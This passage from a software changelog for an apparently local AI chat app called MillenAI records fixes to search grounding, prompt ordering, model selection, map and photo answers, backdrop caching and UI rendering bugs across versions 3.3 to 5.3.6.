  3. THE SHRUG: matched=False now gets its own answer shape — say you
     can't find it by that name, offer the closest real result, ask one
     pin-down question. Shape is taught by a WORKED EXAMPLE for a
     different query; abstract templates get parroted back literally
     ("**Name** - What is it?" appeared in a live answer).
- INSTRUCTIONS AFTER DATA: the answer-shape prompt now comes AFTER the
  snippets/pages, right before the question. Buried before 4KB of
  scraped page text it was forgotten — the model answered by pasting
  Lucali's entire menu and email-signup form.
- Page fetches parallelized (_fetch_pages): serial 7s timeouts were the
  25s time-to-first-token. Pages are fetched only for MATCHED results —
  reading listicles about the neighborhood is pure latency.
- Smoketest: sign-in copy check was case-sensitive and broke silently
  when the copy got capitalized; ZEBRA-42 check normalized (models emit
  U+2011 non-breaking hyphens). New gauntlet check: unknown place must
  get a helpful no-match answer, not a shrug.

## 3.3.1 — greetings out of queries, phrase-loop guard
- "Yo is abes in bushwick open" produced an answer about a place called
  "Yo is Abe's": needs_search stripped the greeting only for its own
  judgment; the QUERY kept it. strip_greeting() factored out, applied to
  the query itself, and it now PEELS STACKED greetings ("yo yo yo",
  "whats good dawg") in a loop. Slang also backstopped in _PLACE_FILLER.
- _looks_degenerate learned phrase loops: "…which is considered to be X
  since the restaurant is not busy" seven times over sailed under every
  uniqueness ratio because the varied nouns diluted it. New rule: any
  4-gram repeated 6+ times is a collapse.
- place_search page fetches ranked by authority: the place's own domain
  (anchor in host) then yelp/tripadvisor/opentable, then the rest — a
  blog post's stale hours once beat the official site to the fetch slot.
- The Milano's/Ridgewood worked example leaked into a real answer
  verbatim; the prompt now fences it ("belong to the example ONLY") and
  the smoketest asserts the fence holds.

## 3.4 — Gemma takes the Fast slot
- A/B'd Qwen 3.6 35B MoE vs Gemma 4 26B vs Phi-4 14B (facts, trick
  math, noisy-data extraction, hallucination bait): accuracy IDENTICAL,
  so the ladder decision came down to temperament. Qwen's hidden
  thinking mode stalls random turns for 15-19s (the "0.9 tok/s" answer)
  and it produced the phrase-loop slop; Gemma held 1-6s on everything,
  never collapsed, followed shape instructions tighter. Phi-4: chatty,
  ignores "just the line", 21s on facts — disqualified.
- Fast and Thinking ladders now rank Gemma 4 26B above the Qwen MoE.
  NOTE both are MoE (Gemma a4b = 4B active, Qwen A3B = 3B active) —
  the "35B" badge is marketing; these are ~3-4B-activation brains.
  A dense Qwen 3.6 27B might beat both but disk is 99% full (22GB
  free), so it stays undownloaded and untested.
- The closed-day check is MECHANICAL now: code scans the snippets for
  "closed …Tue / Tue… closed" matching today's weekday and, on a hit,
  dictates the exact verdict sentence. Lucali-on-a-Tuesday went from
  right-1-in-3 to right-3-of-3; without the hit, the prompt still pins
  today's weekday ("never name any other weekday as today" — a run
  once said "It's closed tonight, Friday" on a Tuesday).
- No-match shape got hard bookends for Gemma (first sentence = can't
  find it, last sentence = a question) — it liked presenting nearby
  cafes as if they were the answer.

## 3.5 — answers voiced like Claude, and the bug that hid a model swap
- VOICE, in SYSTEM_PROMPT and both rewrite passes: never open with a
  title/heading (first line is a sentence spoken TO the person, in
  their register); meet something personal in one genuine clause; end
  an arranging/building task with momentum (the one or two details
  needed) instead of the blanket no-offers rule; NEVER invent named
  things (businesses, retreats, programs) or dress invention as
  experience ("tried-and-tested") — the burnout-retreat answer invented
  three retreats with prices and cohort dates.
- Instructions alone don't stop a 4-bit model from confabulating —
  GROUNDING does: _BOOKING_RX (arranging verb + bookable noun) routes
  recommendation asks to web search, deep pages included, searching
  only the SENTENCE with the ask (whole-message search surfaced Swiss
  burnout clinics). Fence vocabulary matters: when the injected block
  said "results"/"snippets" the answers said "the snippets show" — it
  now says "what you just found", which echoes back as "I found".
- Searched answers were EXCLUDED from the two-pass polish ('not query')
  — every live-data reply was a single take. Bookish answers now get
  the rewrite, fed the grounded message so the reviser can check names
  against data. REVISE no longer says "add missing specifics"
  unconditionally (that INVITED confabulated dates); adds only what is
  certainly true, cuts suspects.
- ROUTER BUG (the big one): a tier request arrives with model="" and
  the route matcher matches on model_name — empty matched nothing and
  fell through to the smallest-cached fallback. The header said Gemma
  while Llama 3.2 1B answered. The desktop UI masked it by sending
  model=council[0]; the tier API path (and my whole test harness) hit
  it. model_name now defaults to the resolved council leader.
- The disk hit 99% (~00:34), Gemma's engine died, respawns failed
  silently, and the never-empty guarantee served 1B for hours — with
  the router bug making it invisible. Lesson: when a test result
  suddenly looks like a different model, CHECK WHICH ENGINE IS
  LISTENING (lsof the port) before tuning prompts against it.
- Turbo "unavailable": Groq free tier is 200k tokens/DAY and Fast
  burns it — the probe worked (16 tok) while real requests 429'd.
  Gemini free tier is the roomier fallback provider.
- No-match place answers: first + last sentences are now DICTATED by
  code (entity split: last term = locality). Gemma paraphrases the
  first ("I'm not aware of…") — semantically identical, accepted.

## 3.6 — the whole sky, and search you can see
- BACKDROPS, third and final round: the "same 3-4" wasn't the picker's
  width — it was (a) days of disk-full silently failing every warm, and
  (b) 18 of 34 cached files being ORPHANS from old catalog hashes
  (unplayable, invisible, eating gigabytes). Now: every launch picks
  from ALL 89 clips (skyhist last-32 excluded), an uncached pick shows
  the loading bar with real progress ("it makes it feel special" — the
  bar IS the feature, per Patrick, reversing the old instant-start
  rule), the 5-min trickle backfills until the whole catalog (~20 GB)
  is local, and the LRU pass deletes orphans + day-old .dl partials.
- SOURCES ROW: searched answers now carry clickable chips (favicon +
  domain, opens the page) under the "searched the web" badge — the
  graphical proof of the search. Server stashes the structured hits in
  a thread-local (_tl_search, cleared per request — keep-alive reuses
  threads), emits one \x00SOURCES:json\x00 marker; client strips it
  like STATUS/DRAFT, renders srcRow(), persists m.sources so chips
  survive reload. Favicons via google s2 (the page already loads
  Google Fonts; same trust boundary).
- run_search's 60s cache now stores rows too — a cache hit used to
  leave the sources row empty while the text answered from cache.
- Every searched answer gets "Today is %A." pinned in the wrapper — a
  generic search reply opened "Mondays can be challenging" on a
  Tuesday (seen live).

## 3.7 — the front door, the icon, and the home team
- NEW ICON (MillenAI.icns + .ico, generated by scripts/pillow at 1024
  then iconutil): rainbow M with a two-pass glow over a starfield and
  the ISS horizon arc — the app's whole identity in one mark. Old icns
  kept only in that session's scratchpad; regenerate from the design
  code in the transcript if ever needed.
- SIGN-IN: primary = Continue with Google + Continue as guest (new
  /api/guest mints a random cookie-scoped profile, 180 days); the
  name+PIN form lives behind an "I have a name & PIN" reveal — owner
  PIN access unchanged. Copy: "Your AI. Walk right in."
- NYC PRIORITY: SKY_NYC (regex comp_N\d{3}_|NY_NIGHT → the four
  N-series aerials + NY-at-night ISS pass) — half of launches lean NYC;
  NYC clips only dodge the last THREE played, not the 32-deep history,
  or five clips could never resurface.
- Wipe .95s → .62s (same full coverage). Version splash covers the
  WHOLE screen (webview.screens size, type in vw) — still only after
  an update, never on fresh installs.
- Searched answers: off-topic results are invisible — never narrated
  ("Mental Floss mentions Generation Beta" appeared in a burnout
  answer; the reader must never learn what the search returned).

## 3.8 — the bar gets its moment
- BACKDROPS, final form (reverses 3.6's stockpile, per Patrick): pick
  fresh every launch, ALWAYS ride the loading bar, keep only the
  playing clip + its predecessor on disk (4.9 GB cache observed →
  1.4 GB). Trickle, cache-pool pick and the Preload button are gone.
  NYC bias and 32-deep history stay.
- The bar itself: 18px tall, pastel-rainbow fill that shimmers (perf
  mode: static), bordered glowing track, lighter tracking-wide label.
- FIRST RUN: plan cards renamed Basic→Fast (matches the tier), and the
  setup card carries a "Share GPU power" checkbox — ticking it at
  Download arms Contribute and marks seen_share so the later one-time
  invite never re-asks. Anyone who already decided has the row hidden.
- Cloud GPU without signup: doesn't exist legitimately — any keyless
  "free LLM API" is someone's abused proxy. The honest answers are the
  Community GPU fleet (no signup, already built) and Turbo with a
  2-minute free key. Documented here so we stop re-asking.

## 3.8.1 — the payoff line
- When the loading bar finishes a real download, "LFG, BITCH." pops in
  rainbow gradient where the bar stood and wipes itself away in 1.25s
  — fires ONLY after an actual wait (hadBar check), never on instant
  starts, never in performance mode.
- The flat grey band across the bottom was #composer-wrap's opaque
  --bg gradient painting over the video — now a translucent scrim
  (rgba(5,6,10,.62)) so the backdrop runs to the window edge.

## 3.8.2 — borrowers don't manage the host
- The models nudge appeared on a PHONE visiting the tunnel (seen live:
  "shouldn't the mobile app use my laptop's models?") — exactly right:
  a remote visitor borrows the host's models. New IS_LOCAL gate
  (hostname is 127.0.0.1/localhost) turns off, for borrowers: the
  first-run installer, the daily models nudge, the share-GPU invite,
  and the sidebar models-up button. Server-side admin lockdown already
  blocked the actions; now the UI stops offering them.

## 3.9 — the fleet is one toggle
- AUTO-APPROVE (fleet_auto pref, default on): a worker that registers
  gets its token in the same response — the whole community-GPU flow is
  now: flip "Contribute GPU power", done. The knock-and-approve flow
  survives behind fleet_auto=false. "reconnecting" state renamed "hub
  offline — retrying"; the advanced Hub URL field is gone from Settings
  (contrib_url in prefs.json still honored).
- REVISE + ATTACHMENTS: the two-pass reviser saw only the bare prompt
  for doc questions — combined with the anti-invention clause it
  deleted a CORRECT answer as unvouchable ("you haven't attached the
  file", 2x in the gauntlet). Doc-carrying answers now feed the
  reviser the full message, same as searched ones. Triple-verified.
- Debugging note: first suspect was a zombie test worker eating fleet
  jobs — wrong (model mismatch made offload impossible); the 45s
  _fleet_alive window plus model matching already guards that.

## 3.9.2 — answers survive chat switches
- Switching chats mid-answer LOST the response (seen live): loadChat
  swaps the global `messages` array, so the in-flight send() pushed the
  finished answer into whichever chat the user switched TO — and
  loadChat also aborted the stream outright.
- Fix: send() pins its owning chat (myChat/myMessages) at start; every
  completion write (push, pop, persist) targets the pinned chat via
  persistChat(id,msgs). loadChat no longer aborts — the answer streams
  on quietly, lands in its own chat, and if you're back viewing that
  chat when it finishes, it paints in. Auto-scroll only fires when the
  owning chat is on screen, so a background finish never yanks the
  view.
- Verified in-browser with the exact repro: send, switch away
  mid-stream, return — full answer present.

## 3.10 — answers with maps and photos (the Fable treatment)
- A matched place answer now carries: source chips, up to three PHOTOS
  (og:image from the pages the search actually fetched — _page_text
  grew a meta out-param, plumbed through _fetch_pages' threads), and a
  pinned LIVE MAP (OpenStreetMap embed iframe; geocoding via Nominatim
  — keyless, cached, identified UA; "Open in Maps" deep-links Apple
  Maps). Bookish answers get photos too.
- Wire format: \x00PHOTOS:[urls]\x00 and \x00MAP:{lat,lon,name}\x00
  markers alongside SOURCES; persisted per message (m.photos, m.map) so
  history keeps its visuals. Photos render with no-referrer + onerror
  self-removal (hotlink-hostile CDNs just disappear quietly).
- Verified live: Lucali → closed-Tuesday verdict, lucali.com/yelp
  chips, the shop's own two photos, and a Henry Street pin on the map.

## 3.10.1 — greetings, full NYC
- The hero greetings rewritten NYC-majority: bodega warmth, subway
  pace ("Bodega's open. What do you need?", "In a New York minute —
  go."). Purged per Patrick: "On God" (no church), "Let's ship
  something" / "move the needle" / "whiteboard" (no startup-speak).
  A plain-spoken handful stays for balance.

## 3.10.2 — the boot wash
- "LFG, BITCH." is a boot ritual now: once per launch, ~2.3s after the
  rainbow wipe starts (right as the wordmark and version settle), it
  washes across the hero — in from the left on a skew, a beat over
  center, out the right, 2.2s total. Sits at top:64% (it originally
  rode the greeting line at 47% and both went muddy — frozen-frame
  check caught it). The loading-bar payoff pop still fires separately
  after real downloads. Perf mode skips both.

## 3.10.3 — one LFG only
- The loading-bar payoff pop is gone; the boot wash is the single
  "LFG, BITCH." moment per launch. lfgPop keyframes retired with it.

## 3.11 — lighter idle, guest passes, more bodega
- PERFORMANCE (no feature lost, per Patrick — "gobbling up my m4 pro"):
  the two always-on rAF loops are gone. Parallax now runs ONLY while
  easing toward a fresh mouse target (was 60-120Hz forever, mouse still
  or not); the wordmark chameleon moved from rAF to a 1.5s clock (its
  probe was 6s-gated anyway). Telemetry polls at 2s (was 1s). A hidden
  window now pauses the 2K video and stops all polling — everything
  resumes on visibilitychange. Idle CPU/GPU drops to near-zero in the
  background; on-screen behavior is pixel-identical.
- GUEST PASSES are temporary now: 24h cookie (was 180d), profile dir
  marked with .guest at creation, and the mlx janitor sweeps marked
  profiles untouched for a week (every ~6h). Sign-in copy says so.
- +25 NYC greetings (bodega-core, transit pain, street wisdom, pure
  attitude — "Showtime. What time is it? SHOWTIME.").

## 3.11.1 — instant city for borrowers, snugger header
- WEB BACKDROP was a black void (seen live in incognito): a tunnel
  visitor's blind pick meant a 250 MB server download + tunnel stream
  before anything showed. Borrowers now pick from the host's CACHED
  clips — instant playback, no ritual; the fresh-pick ceremony stays
  local-only. Blind pick only if the cache is somehow empty.
- Sidebar top consolidated Claude-snug: brand-wrap 12→5px bottom pad,
  mode-tabs margins 12/8→5/6, tab pads 7→5px.

## 3.12 — the standby city, and Claude's chat
- BACKDROPS never blank now: while the fresh pick downloads behind the
  bar, a cached clip plays UNDERNEATH — when the new clip is ready the
  city dips to 22% opacity, swaps src, and fades back up. Progress bar
  + variety + zero wait, all three at once.
- CLAUDE-STYLE CHAT: user messages are compact right-aligned pills (no
  "YOU" label); answers are flat serif prose (ui-serif/Georgia 16.5px)
  straight on the backdrop. Code/pre stay mono inside the serif flow.

## 3.13 — the Fable lever
- BEST TIER: always answers from the configured frontier cloud (the
  Turbo config — Gemini free tier is the roomy default) with the model
  chip naming the provider; falls back to the Fast ladder offline. The
  turbo pref now governs Fast only. Honest architecture: local silicon
  is the floor, frontier cloud is the ceiling, the user picks per query.
- FOLLOW-UP THREADING: "what about tomorrow?" / "do they take
  reservations?" inherit the entity from the last searched turn
  (_thread_terms scans user history; _entity_thin spots queries that
  name nothing — "about" had to join _PLACE_FILLER or "what about
  tomorrow" searched for a BOOK by that name, seen in test). Verified
  three turns deep on Lucali.
- Facts credit their source in-line ("per their website") — the
  attribution rule showed up unprompted in the reservations answer.
- QUALITY LEDGER: app_dir()/quality.jsonl gets one line per answer
  (tier, model, searched, chars) — "make it better" gets numbers.

## 4.0 — the sexy-clean pass
- One design language, per Patrick ("crazy sexy UI... not just vfx but
  cleanliness"): a single glass recipe (rgba(13-15,15-17,20-23) + 26px
  blur + hairline rgba(255,255,255,.07-.13) + 1px inner top highlight)
  unifies sidebar, composer and telemetry. Light does the work borders
  used to do: chat rows are borderless quiet text with soft light-fill
  hover/active; the active mode tab is a bright light pill (dark text)
  — the one pop of contrast in the chrome.
- The composer is the jewel: 24px radius, deep drop shadow, calm
  4px-halo focus ring. Micro-motion: buttons compress (scale .94).
  Scrollbars are 6px glass. Hero greeting wraps balanced. The who
  labels whisper; the rainbow stays exclusive to wordmark/hero/wash.

## 4.1 — the places module (answers like Claude's)
- Place/recommendation answers now end with a machine-read [[PLACES]]
  JSON trailer (max 4 real venues; the client strips it from display).
  The client renders a MODULE: dark multi-pin Leaflet map (CARTO dark
  tiles + OSM, keyless) over a card rail (name, descriptor, hours).
  Pins geocode through the new /api/geo proxy (shared Nominatim cache,
  no CORS). Persisted per message (m.places/m.loc).
- LESSONS: (a) the two-pass reviser DELETED the trailer as filler —
  REVISE_INSTRUCTION now preserves a trailing [[PLACES]] line exactly;
  (b) "pizza spots" wasn't bookish — the noun list gained spots/places/
  joints/shops/diners/delis/bakeries/pizzerias/venues/bodegas;
  (c) geocode sanity: "food bushwick" once pinned EDINBURGH — a pin
  only counts when the result name contains the locality (both the
  server MAP pin and the client module pins).
- The backdrop loading bar can no longer paint over an answer: every
  bar-show site is gated on hero-present + not-generating (plus a
  body.gen CSS kill switch).

## 4.2 — free cloud (honest version), sliding tabs, softer boot
- FREE CLOUD, the truth: scraping Gemini/Claude web UIs is out (their
  terms, and dead-in-a-week endpoints). What exists legitimately:
  pollinations.ai's ANONYMOUS tier (gpt-oss-20b, keyless, built for
  this). Measured behavior: answers for a while, then 402s everything —
  so it's wired as an opportunistic BONUS: Best tier (and keyless
  turbo) tries it with a 15s cap; one failure buys an hour of cooldown;
  never taxes the latency when it's down. Streaming SSE 402s on the
  anonymous tier (measured) — take the whole answer, emit in slices.
- The real "no effort, better answers" path: /api/cloud/set + a
  Settings panel — pick Gemini/Groq/Claude, paste a key, it live-tests
  before saving (0600), arms turbo. Owner-at-machine only. turbo.sh
  still works; nobody needs it now.
- AI|AGENTS is a real segmented control: one lit pill (#tab-glide)
  SLIDES between tabs on a spring curve, Claude-style, labels cross-
  fade. Grouped track, hairline border.
- Backdrops FADE in on every source change (.swapping opacity ramp) —
  boot, standby crossfade, error re-warm — never a hard cut.
- "LFG, BITCH." → "LET'S FUCKING GO." — and after an update, the line
  lives INSIDE the version splash (rainbow gradient, rises at 1.35s);
  the boot wash skips that launch (__SPLASH_LFG__ flag) so it never
  says it twice.
- Web UI gets everything (same file serves both); cloud-key panel is
  IS_LOCAL-gated like the rest of model management.

## 4.3 — "hub offline" fixed, and the map is guaranteed
- THE HUB BUG: the contribute loop's POSTs carried a bare
  "Python-urllib" User-Agent, which the edge 403s — every knock failed
  and Settings read "hub offline — retrying" forever. curl worked;
  we didn't. Same fingerprint that bit us with Groq in 3.x. Fixed by
  sending a real UA; register+poll verified against the live hub.
- "whats a good bar in bushwick" NEVER SEARCHED (no verb for
  _BOOKING_RX) so the model invented three bars from memory (seen
  live). New _ASKY_RX: a quality word (good/best/great/top/worth/
  hidden gem…) plus a place noun is a recommendation ask too. It feeds
  needs_search AND the bookish path, so those answers get grounded,
  deep-searched, photographed and mapped.
- THE MODULE NO LONGER DEPENDS ON MODEL COMPLIANCE. Measured: the
  [[PLACES]] trailer appears maybe half the time, and some answers
  carry no bold spans either — so both the trailer and text-mining
  fail silently. Now a short EXTRACTION PASS runs after the answer on
  the already-resident model ("list the venues this text recommends,
  JSON only"), verifies each name appears in the answer, and emits
  PLACES2. Live: "good bar in bushwick" → The Cobra Club, duckduck,
  House of Yes, Old Stanley's, pinned on the dark map.
  NOTE: use the RESIDENT model, never the smallest — reaching for the
  1B swaps engines and evicts the model that just answered.
- Settings: fleet status block and the button grid get real spacing.

## 4.2.2 — the header download strip
- Background model downloads get a whisper-thin progress strip in the
  sidebar header (under the wordmark, above the AI|Agents slider):
  pastel shimmer fill, "models · 47% · 38 MB/s" mono label, click
  opens the full setup panel. Polls /api/setup every 4s, skips ticks
  while the window is hidden (and corrects itself on visibilitychange
  the instant it's back), shows ONLY when a download runs with the
  setup veil closed.

## 4.2.3 — product type scale
- The 5.0 direction ("total claude replacement, not a backyard
  project") starts with type discipline: serif answers 16.5→15.5px at
  1.62 leading, base body 14.5, sidebar rows 12.5, composer 14.5,
  message gap 26→20, meta at 10px/.85. Same look, product rhythm.
- The backdrop bar could linger over a freshly opened chat: the gates
  only prevented SHOWING it, nothing hid an already-visible bar when
  the hero left. Every tick now corrects visibility both ways, and
  addMsg force-hides it.

## 5.0 — the "it's a real app" release
Five gaps that read as backyard-project, all closed:
- CHAT ORGANIZATION: day grouping (Pinned / Today / Yesterday / This
  week / This month / Older), pin-to-top, dblclick rename in place,
  and delete with a 6s UNDO toast that restores the chat at its old
  index (and reopens it if it was the current one). All fields ride
  the existing chat store, so they persist without schema work.
- COMMAND PALETTE (⌘K): fuzzy over chat TITLES and MESSAGE BODIES —
  searching "cobra" surfaces the chat plus the surrounding sentence —
  plus actions (new chat, settings, model updates, perf toggle, switch
  to any tier). Tier names read from the rendered rows, one source of
  truth. Arrows navigate, Enter opens, Esc closes.
- MESSAGE ACTIONS: hover row under every message — Copy (with a green
  tick), Try again on answers (drops the answer, re-asks), Edit &
  resend on questions (rewinds the thread, loads the text). 
- KEYBOARD: ⌘K palette, ⌘N new chat, Esc stops generation / closes the
  top modal, ↑ on an empty composer recalls the last message, "/"
  focuses the composer.
- HUMAN FAILURE: "The engine returned nothing. Is the model server for
  X actually running?" became "That answer didn't come through — the
  model was still warming up. Try again and it usually lands." with an
  actual Try again button under it. The meta line now carries a
  WHERE badge — THIS MAC / CLOUD / A FRIEND'S GPU.
- NOTE: the Browser pane swallows real ⌘K before the page sees it —
  the handler is fine (verified by dispatching the event); test with a
  synthetic KeyboardEvent, not a real keypress.

## 5.1 — full send
- ONE BACKDROP PER LAUNCH: the standby-then-swap (cached clip playing
  while the real pick downloaded, then flipping) read as the app
  changing its mind — gone. The picker now leans 60% toward clips
  already on disk so most launches are instant, and when it does
  download, the bar waits for the ONE chosen clip.
- LIVE ACTIVITY TREE: STEP markers stream from the real pipeline
  (searched N sources / read pages / located on map / drafting /
  sharpening / finding places) into a Claude-style panel with a
  shimmer progress bar; it collapses to "› N steps · done" and
  re-expands on click. The tree DOUBLES AS A LIE DETECTOR: "best pizza
  in williamsburg" showed only 2 steps — no search — because "pizza"
  wasn't a trigger noun, and the memory-answer had put pizza on
  Lilia's menu. Food nouns (pizza, tacos, coffee, ramen…) now count.
- SETTINGS REBUILT: PERSONALITY / POWER / MAINTENANCE sections with
  micro-headers, the cloud-key card gridded so nothing truncates,
  maintenance as a full-width stacked list, pinned Close.
- WORKSPACE (the Claude-Code seed): owner-only, read-only. Point it at
  a folder (/api/workspace/set), the Workspace agent ranks files
  against the question and pastes the best windows under the prompt.
  Window anchor = the RAREST matching word — anchoring on the earliest
  hit put the window at the top of the file where "file" and
  "function" live (seen live). Verified: explained place_search from
  millenai.py accurately, citing the file.

## 5.2 — the drop
- THE DROP: the boot LFG line is dead-center of the WINDOW both axes
  (was hero-area, top:64%, offset by the sidebar). Letters slam in one
  by one — per-char spans, each carrying its own two-stop slice of the
  palette, staggered 38ms — because animating children under a parent
  background-clip:text repaints unreliably; per-char gradients are the
  workaround. An aurora conic bloom breathes behind (::before), an
  elliptical ring shockwave detonates at ~0.95s (::after), 16 sparks
  eject, and the exit pulls THROUGH the camera (scale+blur+fade), not
  off to the side. Gauntlet gotcha: the JS flag `lfgWashed` contains
  the substring "lfgWash" — assert on "keyframes lfgWash{", not the
  bare name.
- PREPARED CITY: after the backdrop reveals (+9s), the client warms
  ONE different clip (same NYC bias — the prepared clip IS tomorrow's
  pick) and records it in millen.skynext only once READY. Next launch
  short-circuits the picker to it: instant start, no bar, never a
  flip. Server unchanged: _send_sky already touches mtime on serve, so
  the keep-two LRU holds exactly {playing, prepared}. Borrowers never
  prefetch (IS_LOCAL gate) — web visitors must not grow the disk.
- CODE IS A TAB: AI | Code | Agents. The Code tab owns Coding +
  Workspace (CODE_AGENTS); Agents keeps the rest. Opening Code
  activates the last-used code specialist (millen.codeagent) on the
  spot; leaving it drops back to Standard so the chip never says
  "Coding" under the AI tab. The glide pill generalizes to thirds:
  width calc(33.334% - 2px), translateX(100%/200%) — %-transforms are
  relative to the pill's own width, so no container math.
- PINWHEEL: ✱ spinning the identity gradient (background-clip:text +
  rotate) sits left of the activity-tree bar (.wthead) and replaces ◇
  in the statusline. perf mode stills it.
- ICON: the old artwork painted its tile edge-to-edge on the 1024
  canvas; modern macOS shrinks non-conforming icons into the system
  squircle — THAT's why it read smaller than neighbours. New icon
  (make_icon.py) draws on the real Apple grid: 824×824 squircle,
  r=185, margins 100 — plus glowing rainbow M (Condensed Black, 66%),
  starfield, aurora, amber horizon, rim light. Same art → MillenAI.ico.
- LATENT BUG FIXED: setup_status had the ONE bare psutil call in the
  file — /api/setup died (and the header download strip with it) on
  any python without psutil. Found because the bare Homebrew 3.14 test
  instance also lacks ddgs → HAS_SEARCH=False → "no search step" red
  herring. Test instances must run on the app venv:
  ~/Library/Application Support/MillenAI/venv/bin/python3.

## 5.3 — housekeeping with teeth
- THE DEAD BUTTON was a missing </div>: the 5.1 Settings rebuild never
  closed #about-veil, so the PARSER adopted every veil below it
  (#dlhelp, #share, #setup) as children of the hidden modal —
  position:fixed inside a display:none ancestor renders at 0x0, so
  openSetup() "ran" invisibly. Computed style looked perfect
  (display:flex, opacity:1); only getBoundingClientRect told the
  truth. When a fixed overlay opens at 0x0, count your closing tags.
- TIERS: Best removed (without a cloud key it WAS Fast — same ladder,
  same answer); Power removed, Pro absorbed it whole: all:True,
  count:99, peer review on, and the merge pass now prefers the LARGEST
  Gemma 4 that fits (26B before 12B — the old order quietly picked the
  small one on big machines). Old clients aliased server- AND
  client-side: Smart→Fast, Best→Fast, Power→Pro.
- SETTINGS: MAINTENANCE header gone, the three rows compressed
  (7px 12px, 5px gap). Header wordmark switched to the hero's Space
  Grotesk (tracking -.012em), greys untouched; the version keeps mono.
- METERS: t-head 11px, labels 10.5px with align-items:center +
  min-height so the MODELS caption sits centered against the ↑ chip
  (it hung off baseline before), card padding tightened.
- ICON: greyscale — brushed-silver M on charcoal, faint stars, quiet
  glow. Same Apple-grid envelope as 5.2 (that part was right); the
  rainbow was the problem, not the size.

## 5.3.1 — the pantry
- BACKDROP CACHING, THIRD TRY (per Patrick: "no background, or takes
  forever, or super slow"): the 3.8 no-stockpile rule is rescinded.
  The server now keeps up to 8 clips (~2 GB ceiling, LRU on mtime
  which serving touches). After the backdrop reveals, fillPantry
  stocks the shelf one clip at a time until 5 spares sit on disk,
  NYC-biased, skipping recent history and clips that errored this
  session. The boot picker is DISK FIRST, ALWAYS: fresh-on-disk from
  the biased pool, else any cached clip that isn't last night's —
  the download bar is a true-first-run experience only. skynext stays
  primed so the next pick is decided before the app closes.
- ICON: reverted to the About-panel bar-chart mark by ask — four
  rounded bars sweeping #8b5cf6→#7d8fff→#4cc9e0 with the teal dot,
  charcoal tile, Apple-grid envelope kept from 5.2. Bars drawn 2x and
  LANCZOS-downsampled because PIL has no antialiasing.

## 5.3.2 — lanes
- THE SIDEBAR FOLLOWS THE TAB (like Claude): every chat is born with a
  lane — the tab it started on (ai/code/agents) — and renderChats shows
  the active lane only. Legacy records without a lane read as "ai" and
  live under Chat. ⌘K still reaches everything; opening a chat from
  another lane hops the tab (and its agent) along via switchLane, so
  the sidebar context always matches the screen. Empty lanes say "No
  code chats yet" instead of sitting blank.
- AI is now CHAT, and all three tabs carry 12px inline stroke icons
  (bubble / </> / spark), flexed with a 6px gap.
- TDZ BIT TWICE: setTier(tier) runs at boot and reaches modeShow. A
  `let uiMode` declared next to modeShow crashed the ENTIRE boot script
  (empty sidebar, dead app) — it lives in the early state block with
  engineState, which exists for exactly this. And renderChats() called
  synchronously from modeShow hit the same wall via `let chats` below —
  it's a setTimeout(,0) now. The console errors that follow such an
  abort (simGpu, agentsWrap) are downstream noise of the one real
  crash, and stale entries persist across reloads — timestamp a marker
  before trusting them.
- Dev preview launcher moved to .claude/run_backend.py — the session
  scratchpad gets wiped between sessions and silently took the old
  launcher (and launch.json's target) with it.

## 5.3.3 — the seam
- THE "WEIRD EDGE": the boot reveal drives THREE masked layers
  (#sky-color, #hero h1::after, and the blurred .halo span) by sliding
  a 114° gradient mask. A stalled slide — occluded window, throttled
  frame, cancelled transition — strands a mask mid-screen, and the
  HALO's stranded edge (blur 19px + saturate 1.55) reads as a
  permanent teal glowing seam beside the wordmark. Diagnosed by
  elimination: steady-state mask-position computes to 0 (seamless),
  the warp canvas is retired and cleared, and a forced mid-flight
  backdrop mask fades the WRONG way (bright-left) with a far softer
  ramp than the artifact.
- FIX SHAPE, not symptom: masks now exist only during the show. The
  6.4s wipe cleanup adds body.paintdone, which sets mask-image:none
  !important on all three layers — steady state carries ZERO mask, so
  there is nothing left to strand, whatever WebKit does to a
  transition mid-flight.

## 5.3.4 — the seam, actually
- 5.3.3's mask teardown was CORRECT HARDENING BUT THE WRONG CULPRIT —
  the seam survived it (verified against the live 5.3.3 app: all three
  masks computed to none, edge still present in the render). The real
  cause: WebKit rasterizes a filtered element into a layer sized to
  its BOX and CLIPS the blur output there. The wordmark halo
  (blur 19px, saturate 1.55) is exactly the h1's text box — measured
  identical rects — so the bloom terminated in a hard vertical line
  ~40-60px beside the M. The "seam colour" was the glow itself: teal
  over the night clip, amber over the sunset clip.
- DIAGNOSIS THAT WORKED: amplify the suspect (blur 30 / brightness
  2.2) and screenshot — the rectangular clip became unmissable. Column
  -mean pixel scans had already cleared the video (no coherent edge in
  the footage) and elementsFromPoint cleared the overlay stack.
- FIX: the classic filter-clip workaround — padding:130px;
  margin:-130px on .halo. The raster bounds grow 130px past the text,
  the blur fades to nothing well inside them, and the negative margin
  keeps alignment (span rect verified unmoved). Amplified re-test:
  smooth falloff on every side, no straight edges.

## 5.3.5 — the seam, third form, and the rolling shelf
- THE SEAM SURVIVED 5.3.4 in the app while the Chromium pane verified
  clean — because the pane is BLINK and the app is WKWEBVIEW. The
  padded-wrapper workaround that satisfies Blink turned the artifact
  into a crisper rainbow sliver in WebKit (ancestor filter +
  background-clip:text misrender). LESSON, in caps: A FIX FOR A
  RENDERING BUG MUST BE VERIFIED ON THE ENGINE THAT SHOWS IT — the
  desktop app is Safari's engine, the preview pane is Chrome's.
- FINAL FORM: the halo is a CANVAS. haloTick (400ms, hero-only,
  skips perf/hidden) redraws "MillenAI" with the travelling 16s
  rainbow phase and blurs AT DRAW TIME via ctx.filter — the pixels
  arrive pre-blurred, so no engine compositor ever gets a chance to
  clip them. Measured: max per-pixel alpha step across the glow is
  4/255 — smoothness by construction. haloCap() probes that
  ctx.filter actually spreads ink (a no-op filter would paint SHARP
  text behind the wordmark); unsupported engines get no halo rather
  than a wrong one. The DOM .halo stays in the markup (the gauntlet
  and wipe classes reference it) but is display:none.
- ROLLING SHELF (per Patrick: "randomize as much as possible… not
  100gb"): fillPantry now sets millen.skynext IMMEDIATELY (favoring
  never-seen spares), and even with full shelves streams ONE fresh
  never-seen clip per session — the keep-8 LRU evicts the oldest, so
  disk stays ~2 GB while the catalog cycles. When the fresh clip
  lands it TAKES OVER skynext: most launches open on footage the
  user has literally never seen, downloaded invisibly the session
  before. True stream-on-first-play is impossible with Apple's
  sources: moov sits at the END of the file (hence _faststart), so
  nothing can play until the last byte arrives — rotation is the
  honest fix.
- Browser-pane gotcha: document.hidden is TRUE in the pane even when
  the page renders — anything gated on it (haloTick, the chameleon)
  looks dead there. Override the getter to test.

## 5.3.6 — the amnesiac window
- WHY THE BACKDROP NEVER ROTATED despite a working pantry: pywebview
